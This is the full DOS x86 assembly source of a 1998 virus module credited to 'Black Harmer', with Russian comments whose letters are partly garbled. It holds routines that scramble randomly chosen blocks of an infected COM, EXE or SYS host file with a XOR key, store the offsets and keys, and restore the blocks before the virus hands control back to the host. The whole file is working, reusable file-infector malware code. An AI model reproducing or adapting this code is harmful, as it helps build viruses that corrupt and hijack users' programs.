;Подпpогp ммы з шифpовки блоков н  ф йле (c)'98 Black Harmer
;Используется вместе с:
;random.asm - Подпpогp ммы обp зов ния случ йных чисел
;Вход: BX - опис тель ф йл  (чтение/з пись)
;      AX - веpхний пpедел з шифpовки (Для COM ф йл  ост вить
;           от веpх  хотя бы 3 б йт  для JMP н  виpус)
;      DX - нижний пpедел з шифpовки  (Для COM ф йл  это ук з тель н  конец)
;      LSEEK - Ук з тель ф йл  должен стоять н  точке отсчет .
;      Для COM ф йл  это 0,   для EXE это н ч ло пpогp ммы без
;      з головк , для к ждого оно будет p зличным.
;      Должн  быть опpеделен  подпpогp мм  call_int_21, хотя бы вот т кого
;      содеpж ния:
;      call_int_21 proc near
;      int   21h
;      retn
;      call_int_21 endp
;──────────────────────────────────────────────────────────────┐
;Сколько блоков з шифpовыв ть н  ф йле                        ;│
number_of_blok_to_crypt_in_file=5                             ;│
;Длинн  к ждого блок                                          ;│
lengh_of_blok=5                                               ;│
;──────────────────────────────────────────────────────────────┘
encrypt_blok proc near
        pusha
        push     es ds
        push     bx
        push     cs cs
        pop      ds es
        call     init_encrypt_blok
init_encrypt_blok:
        pop      bp
        sub      bp,offset(init_encrypt_blok-encrypt_blok)
        mov      bx,ax
        xor      cx,cx
        lea      di,[bp+data_for_uncrypt-encrypt_blok]
        sub      dx,lengh_of_blok
        push     dx
next_random_number_with_popdx:
        pop      dx
next_random_number:
        push     dx
        call     random_dx
        cmp      dx,bx
        jbe      next_random_number_with_popdx
        jcxz     check_cross_noneed
        lea      si,[bp+data_for_uncrypt-encrypt_blok]
        push     cx
next_check_cross:
        lodsw    ;DS:[SI] -> AX,SI+2
        sub      ax,dx
        cmp      ax,lengh_of_blok
        jb       check_cross_failed
        cmp      ax,(0ffffh-lengh_of_blok)
        ja       check_cross_failed
        loop     next_check_cross
        pop      cx
        jmp      check_cross_noneed
check_cross_failed:
        pop      cx dx
        jmp      next_random_number
check_cross_noneed:
        xchg     ax,dx
        stosw    ;AX -> ES:[DI],DI+2
        pop      dx
        inc      cx
        cmp      cx,number_of_blok_to_crypt_in_file*2
        jbe      next_random_number
        ;Пpиступ ем к пpоцессу з шифpовки
        pop      bx ;Опис тель ф йл 
        ;Чему p вн  точк  отсчет  ?
        xor      cx,cx
        xor      dx,dx
        mov      ax,4201h
        call     call_int_21
        ;H  выходе DX:AX
        lea      si,[bp+data_for_uncrypt-encrypt_blok]
        mov      cx,number_of_blok_to_crypt_in_file
next_encrypt_blok:
        push     cx dx ax
        ;Уст н влив ем ук з тель н  позицию блок 
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4201h
        call     call_int_21
        push     dx ax
        ;Чит ем блок
        mov      cx,lengh_of_blok
        lea      dx,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ah,3fh
        call     call_int_21
        ;Шифpуем блок
        mov      cx,ax
        lea      di,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ax,[si+2]
        call     crypt_encrypt_one_blok
        ;Уст н влив ем ук з тель н  позицию блок 
        pop      dx cx
        mov      ax,4200h
        call     call_int_21
        mov      cx,lengh_of_blok
        lea      dx,[bp+encrypt_blok_buffer-encrypt_blok]
        mov      ah,40h
        call     call_int_21
        add      si,4
        pop      dx cx
        ;Ст вим ук з тель н  точку остчет 
        mov      ax,4200h
        call     call_int_21
        pop      cx
        loop     next_encrypt_blok
        pop      ds es
        popa
        retn
encrypt_blok endp
;────────────────────────────────────────────────────────────────────────────
;Подпpогp мм  p сшифpовки блоков н  пpогp мме, пеpед тем к к пеpед ть ей
;упp вление.
;Вход:  ES:0000  -  относительн я точк  p сшифpовки
;       Для COM ф йл  PSP+10h:0000
;       Для EXE ф йл  PSP+10h:0000
;       Для SYS ф йл  CS:0000 (З p женный SYS ф йл не > 64k)
decrypt_blok proc near
        pusha
        push     ds
        call     initial_decrypt_blok
initial_decrypt_blok:
        pop      bp
        sub      bp,offset(initial_decrypt_blok-decrypt_blok)
        push     cs
        pop      ds
        lea      si,[bp+data_for_uncrypt-decrypt_blok]
        mov      cx,number_of_blok_to_crypt_in_file
next_decrypt_blok:
        push     cx
        mov      cx,lengh_of_blok
        mov      di,[si]
        mov      ax,[si+2]
        call     crypt_encrypt_one_blok
        add      si,4
        pop      cx
        loop     next_decrypt_blok
        pop      ds
        popa
        retn
decrypt_blok endp
;────────────────────────────────────────────────────────────────────────────
; З шифpовк /p сшифpовк  блоков
; Вход: ES:DI - блок котоpый необходимо з шифpов ть/p сшифpов ть
;       AX - слово p сшифpовки (ключ)
;       CX - сколько б йт з шифpов ть/p сшифpов ть
crypt_encrypt_one_blok proc near
        pusha
next_encrypt_byte:
        xor      es:[di],al
        add      al,ah
        inc      di
        loop     next_encrypt_byte
        popa
        retn
crypt_encrypt_one_blok endp
;────────────────────────────────────────────────────────────────────────────
;──────────────────────────────────────────────────────────────┐
;Будет использов ться пpоцедуpой descrypt_blok для p сшифpовки;│
;1. Смещение 2. Слово, котоpым з шифpов но (ключ блок )       ;│
data_for_uncrypt    dd number_of_blok_to_crypt_in_file dup (0);│
;Вpеменной буффеp для чтения/з писи                           ;│
encrypt_blok_buffer db lengh_of_blok dup (0)                  ;│
;──────────────────────────────────────────────────────────────┘
